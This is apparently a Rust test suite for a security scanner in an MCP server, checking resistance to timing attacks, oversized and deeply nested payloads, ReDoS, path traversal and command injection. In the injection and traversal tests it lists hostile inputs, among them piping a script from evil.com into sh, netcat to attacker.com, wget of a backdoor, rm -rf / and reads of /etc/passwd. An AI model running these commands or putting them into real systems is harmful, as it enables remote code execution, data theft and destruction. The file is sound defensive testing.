//! Security-Specific Test Suite
//! Tests for timing attacks, resource exhaustion, and other security concerns

use kindly_guard_server::{Config, McpServer, ScannerConfig, SecurityScanner};
use proptest::prelude::*;
use serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};

mod helpers;

/// Test constant-time operations
#[test]
fn test_constant_time_token_comparison() {
    // Test that token comparison takes similar time regardless of match position
    let valid_token = "Bearer valid-token-12345678901234567890";
    let test_cases = vec![
        (
            "Bearer invalid-token-12345678901234567890",
            "completely different",
        ),
        (
            "Bearer valid-token-12345678901234567891",
            "differs at last char",
        ),
        ("Bearer valid-token-12345678901234567890", "exact match"),
        (
            "Bearerinvalid-token-12345678901234567890",
            "differs at first char",
        ),
        ("Bearer v", "short token"),
        ("", "empty token"),
    ];

    let mut timings = Vec::new();

    for (test_token, description) in test_cases {
        let start = Instant::now();

        // Simulate constant-time comparison
        let mut diff = 0u8;
        let valid_bytes = valid_token.as_bytes();
        let test_bytes = test_token.as_bytes();
        let len = std::cmp::max(valid_bytes.len(), test_bytes.len());

        for i in 0..len {
            let v = valid_bytes.get(i).unwrap_or(&0);
            let t = test_bytes.get(i).unwrap_or(&0);
            diff |= v ^ t;
        }

        let _is_equal = diff == 0;
        let elapsed = start.elapsed();

        timings.push((description, elapsed));
    }

    // Check that timings are similar (within 50% of each other)
    let max_time = timings.iter().map(|(_, t)| t.as_nanos()).max().unwrap();
    let min_time = timings.iter().map(|(_, t)| t.as_nanos()).min().unwrap();

    assert!(
        max_time <= min_time * 3 / 2,
        "Timing attack possible: max={max_time:?}ns, min={min_time:?}ns"
    );
}

#[tokio::test]
async fn test_dos_protection_large_payload() {
    let config = Config::default();
    let server = Arc::new(McpServer::new(config).unwrap());

    // Create very large payload (10MB)
    let large_text = "a".repeat(10 * 1024 * 1024);

    let request = json!({
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "scan_text",
            "arguments": {
                "text": large_text
            }
        },
        "id": 1
    });

    let start = Instant::now();
    let response = server.handle_message(&request.to_string()).await;
    let elapsed = start.elapsed();

    // Should either reject or complete quickly
    assert!(
        response.is_some() && elapsed < Duration::from_secs(5),
        "Large payload DoS: took {elapsed:?}"
    );
}

#[tokio::test]
async fn test_dos_protection_deeply_nested_json() {
    let config = Config::default();
    let server = Arc::new(McpServer::new(config).unwrap());

    // Create deeply nested JSON (1000 levels)
    let mut deeply_nested = json!("value");
    for _ in 0..1000 {
        deeply_nested = json!({"nested": deeply_nested});
    }

    let request = json!({
        "jsonrpc": "2.0",
        "method": "tools/call",
        "params": {
            "name": "scan_json",
            "arguments": {
                "json": deeply_nested
            }
        },
        "id": 1
    });

    let response = server.handle_message(&request.to_string()).await;

    // Should handle gracefully (either error or succeed)
    assert!(response.is_some());
    let response_json: Value = serde_json::from_str(&response.unwrap()).unwrap();

    // Should either return error or complete scan
    assert!(
        response_json["error"].is_object() || response_json["result"].is_object(),
        "Should handle deeply nested JSON"
    );
}

#[tokio::test]
async fn test_regex_dos_protection() {
    let config = ScannerConfig {
        unicode_detection: true,
        injection_detection: true,
        path_traversal_detection: true,
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        xss_detection: Some(true),
        enhanced_mode: Some(false),
    };

    let scanner = SecurityScanner::new(config).unwrap();

    // Test patterns that could cause catastrophic backtracking
    let evil_patterns = vec![
        format!("{}X", "a".repeat(100)), // Long string with no match
        "(a+)+".repeat(10),              // Nested quantifiers
        "(a*)*b".to_string(),            // Catastrophic pattern
        "(x+x+)+y".to_string(),          // Another catastrophic pattern
    ];

    for pattern in evil_patterns {
        let start = Instant::now();
        let _ = scanner.scan_text(&pattern);
        let elapsed = start.elapsed();

        assert!(
            elapsed < Duration::from_millis(100),
            "ReDoS protection failed for pattern: {pattern}, took {elapsed:?}"
        );
    }
}

#[tokio::test]
async fn test_memory_exhaustion_protection() {
    let config = Config::default();
    let server = Arc::new(McpServer::new(config).unwrap());

    // Try to exhaust memory with many concurrent requests
    let mut handles = vec![];

    for i in 0..1000 {
        let server = server.clone();
        let handle = tokio::spawn(async move {
            let request = json!({
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "scan_text",
                    "arguments": {
                        "text": "x".repeat(1024) // 1KB per request
                    }
                },
                "id": i
            });

            tokio::time::timeout(
                Duration::from_secs(5),
                server.handle_message(&request.to_string()),
            )
            .await
        });
        handles.push(handle);
    }

    // Should handle all requests without OOM
    let mut success_count = 0;
    for handle in handles {
        if let Ok(Ok(Some(_))) = handle.await {
            success_count += 1;
        }
    }

    // At least some should succeed
    assert!(success_count > 0, "Memory exhaustion protection failed");
}

#[tokio::test]
async fn test_path_traversal_prevention() {
    let config = ScannerConfig {
        unicode_detection: false,
        injection_detection: false,
        path_traversal_detection: true,
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        xss_detection: Some(false),
        enhanced_mode: Some(false),
    };

    let scanner = SecurityScanner::new(config).unwrap();

    let traversal_attempts = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/../../etc/passwd",
        "C:\\webapp\\..\\..\\..\\windows\\system32",
    ];

    for attempt in traversal_attempts {
        let threats = scanner.scan_text(attempt).unwrap();
        assert!(
            !threats.is_empty(),
            "Failed to detect path traversal in: {attempt}"
        );
    }
}

#[tokio::test]
async fn test_command_injection_prevention() {
    let config = ScannerConfig {
        unicode_detection: false,
        injection_detection: true,
        path_traversal_detection: false,
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        xss_detection: Some(true),
        enhanced_mode: Some(false),
    };

    let scanner = SecurityScanner::new(config).unwrap();

    let command_injections = vec![
        "; cat /etc/passwd",
        "| nc attacker.com 1234",
        "& net user hacker password /add",
        "`rm -rf /`",
        "$(curl evil.com/shell.sh | sh)",
        "|| wget http://evil.com/backdoor",
        "; python -c 'import socket; socket.socket()'",
        "\n/bin/sh\n",
    ];

    for injection in command_injections {
        let threats = scanner.scan_text(injection).unwrap();
        assert!(
            !threats.is_empty(),
            "Failed to detect command injection in: {injection}"
        );
    }
}

#[tokio::test]
async fn test_auth_token_entropy() {
    // Test that auth tokens have sufficient entropy
    let test_tokens = vec![
        "password123",                  // Weak
        "12345678",                     // Weak
        "aaaaaaaa",                     // Weak
        "test-token",                   // Weak
        "xJ9#mK2$pL5@nQ8&rT1!vY4*wZ7^", // Strong
    ];

    for token in test_tokens {
        let entropy = calculate_entropy(token);

        // Tokens should have at least 40 bits of entropy
        if token.len() > 8 {
            assert!(
                entropy > 40.0,
                "Token '{token}' has insufficient entropy: {entropy:.2} bits"
            );
        }
    }
}

fn calculate_entropy(s: &str) -> f64 {
    use std::collections::HashMap;

    let mut char_counts = HashMap::new();
    for c in s.chars() {
        *char_counts.entry(c).or_insert(0) += 1;
    }

    let len = s.len() as f64;
    let mut entropy = 0.0;

    for count in char_counts.values() {
        let probability = f64::from(*count) / len;
        entropy -= probability * probability.log2();
    }

    entropy * len
}

#[tokio::test]
async fn test_unicode_normalization_attacks() {
    let config = ScannerConfig {
        unicode_detection: true,
        injection_detection: false,
        path_traversal_detection: false,
        custom_patterns: None,
        max_scan_depth: 10,
        enable_event_buffer: false,
        xss_detection: Some(false),
        enhanced_mode: Some(false),
    };

    let scanner = SecurityScanner::new(config).unwrap();

    // Test various unicode normalization attacks
    let normalization_attacks = vec![
        // Different representations of the same character
        ("e\u{0301}", "é"),               // e + combining acute accent
        ("\u{1FBF}", "\u{0020}\u{0313}"), // Greek psili
        ("\u{00C5}", "\u{0041}\u{030A}"), // Å vs A + ring
        // Security-relevant normalizations
        ("\u{2044}", "/"), // Fraction slash vs normal slash
        ("\u{FF0F}", "/"), // Fullwidth solidus
        ("\u{2215}", "/"), // Division slash
    ];

    for (attack, _normalized) in normalization_attacks {
        let threats = scanner.scan_text(attack);
        // Scanner should detect potential normalization issues
        assert!(threats.is_ok());
    }
}

proptest! {
    #[test]
    fn test_no_panics_on_random_input(
        input in prop::string::string_regex(".*").unwrap()
    ) {
        let config = ScannerConfig {
            unicode_detection: true,
            injection_detection: true,
            path_traversal_detection: true,
            custom_patterns: None,
            max_scan_depth: 10,
            enable_event_buffer: false,
            xss_detection: Some(true),
            enhanced_mode: Some(false),
        };

        // Create a tokio runtime for the scanner
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            if let Ok(scanner) = SecurityScanner::new(config) {
                // Should never panic, regardless of input
                let _ = scanner.scan_text(&input);
            }
        });
    }

    #[test]
    fn test_consistent_threat_detection(
        base in "[a-zA-Z0-9 ]{1,50}",
        threat_type in 0..5u8
    ) {
        let config = ScannerConfig {
            unicode_detection: true,
            injection_detection: true,
            path_traversal_detection: true,
            custom_patterns: None,
            max_scan_depth: 10,
            enable_event_buffer: false,
            xss_detection: Some(true),
            enhanced_mode: Some(false),
        };

        // Create a tokio runtime for the scanner
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            if let Ok(scanner) = SecurityScanner::new(config) {
                // Add known threat pattern
                let input = match threat_type {
                    0 => format!("{base}\u{200B}{base}"), // Zero-width space
                    1 => format!("{base}' OR '1'='1"),      // SQL injection
                    2 => format!("{base}/../../../etc"),    // Path traversal
                    3 => format!("{base}; echo pwned"),     // Command injection
                    _ => base,
                };

                // Run multiple times - should get same result
                let result1 = scanner.scan_text(&input);
                let result2 = scanner.scan_text(&input);

                match (result1, result2) {
                    (Ok(threats1), Ok(threats2)) => {
                        prop_assert_eq!(threats1.len(), threats2.len());
                    }
                    (Err(_), Err(_)) => {} // Both failed is consistent
                    _ => prop_assert!(false, "Inconsistent results"),
                }
            }
            Ok(())
        });
    }
}
